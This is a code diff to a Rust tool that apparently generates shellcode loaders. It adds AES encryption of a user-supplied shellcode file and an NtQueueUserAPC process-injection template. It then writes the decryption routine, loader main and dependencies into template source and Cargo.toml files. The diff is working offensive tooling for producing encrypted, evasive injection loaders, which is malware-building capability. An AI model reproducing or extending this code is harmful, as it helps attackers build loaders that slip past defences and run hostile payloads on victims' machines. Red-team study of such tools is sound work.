@@ -2,6 +2,7 @@
 use crate::arg_parser::{Encryption, Execution, Order};
 use crate::tools::{absolute_path, random_u8, path_to_string};
 use crate::xor::meta_xor;
+use crate::aes::meta_aes;
 use fs_extra::dir::{copy, CopyOptions};
 use random_string::generate;
 use std::collections::HashMap;
@@ -10,20 +11,22 @@ use std::io::prelude::*;
 use std::path::Path;
 use std::path::PathBuf;
 use std::str;
+use crate::tools::random_aes_key;
+use crate::tools::random_aes_iv;
 
 fn search_and_replace(
-    path_to_main: &Path,
+    path_to_file: &Path,
     search: &str,
     replace: &str,
 ) -> Result<(), Box<dyn std::error::Error>> {
     // thanks to https://users.rust-lang.org/t/replacing-content-in-file/52690/5
-    let file_content = fs::read_to_string(path_to_main)?;
+    let file_content = fs::read_to_string(path_to_file)?;
     let new_content = file_content.replace(search, replace);
 
     let mut file = OpenOptions::new()
         .write(true)
         .truncate(true)
-        .open(path_to_main)?;
+        .open(path_to_file)?;
     file.write_all(new_content.as_bytes())?;
 
     Ok(())
@@ -59,8 +62,9 @@ pub fn meta_puzzle(order: Order) -> PathBuf {
     general_output_folder.push("shared");
 
     let path_to_template = match order.execution {
-        Execution::CreateThread => Path::new("templates/createThread/."),
-        Execution::CreateRemoteThread => Path::new("templates/createRemoteThread/."),
+        // Execution::CreateThread => Path::new("templates/createThread/."),
+        // Execution::CreateRemoteThread => Path::new("templates/createRemoteThread/."),
+        Execution::NtQueueUserAPC => Path::new("templates/ntAPC/."),
         Execution::NtCreateRemoteThread => Path::new("templates/ntCRT/."),
         Execution::SysCreateRemoteThread => Path::new("templates/sysCRT/.")
     };
@@ -120,6 +124,57 @@ pub fn meta_puzzle(order: Order) -> PathBuf {
             for (key, value) in to_be_replaced.iter() {
                 let _ = search_and_replace(&to_main, key, value);
             }
+        }
+        Some(Encryption::Aes) => {
+            let key = random_aes_key();
+            let iv = random_aes_iv();
+
+            let mut path_to_aes = to_main.clone();
+            path_to_aes.pop();
+            path_to_aes.push("input.aes");
+            let absolute_path_to_aes = match absolute_path(&path_to_aes) {
+                Ok(path) => path,
+                Err(err) => panic!("{:?}", err),
+            };
+            let absolute_path_to_aes_as_string = path_to_string(&absolute_path_to_aes);
+
+            let aes_args: HashMap<String, String> =
+            meta_aes(&order.shellcode_path, &path_to_aes, &key, &iv);
+
+            let decryption_function = match aes_args.get("decryption_function") {
+                Some(content) => content,
+                None => panic!("I don't even know how this happened.."),
+            };
+            let main = match aes_args.get("main") {
+                Some(content) => content,
+                None => panic!("I don't even know how this happened.."),
+            };
+            let dependencies = match aes_args.get("dependencies") {
+                Some(content) => content,
+                None => panic!("I don't even know how this happened.."),
+            };
+            let imports = match aes_args.get("imports") {
+                Some(content) => content,
+                None => panic!("I don't even know how this happened.."),
+            };
+            to_be_replaced.insert("{{DECRYPTION_FUNCTION}}", decryption_function);
+            to_be_replaced.insert("{{MAIN}}", main);
+            to_be_replaced.insert("{{PATH_TO_SHELLCODE}}", &absolute_path_to_aes_as_string);
+            to_be_replaced.insert("{{DEPENDENCIES}}", dependencies);
+            to_be_replaced.insert("{{IMPORTS}}", &imports);
+            
+
+            let mut path_to_cargo = to_main.clone();
+            path_to_cargo.pop();
+            path_to_cargo.pop();
+            path_to_cargo.push("Cargo.toml");
+
+            for (key, value) in to_be_replaced.iter() {
+                let _ = search_and_replace(&to_main, key, value);
+                let _ = search_and_replace(&path_to_cargo, key, value);
+            }
+
+
         }
         None => {
             for (key, value) in to_be_replaced.iter() {
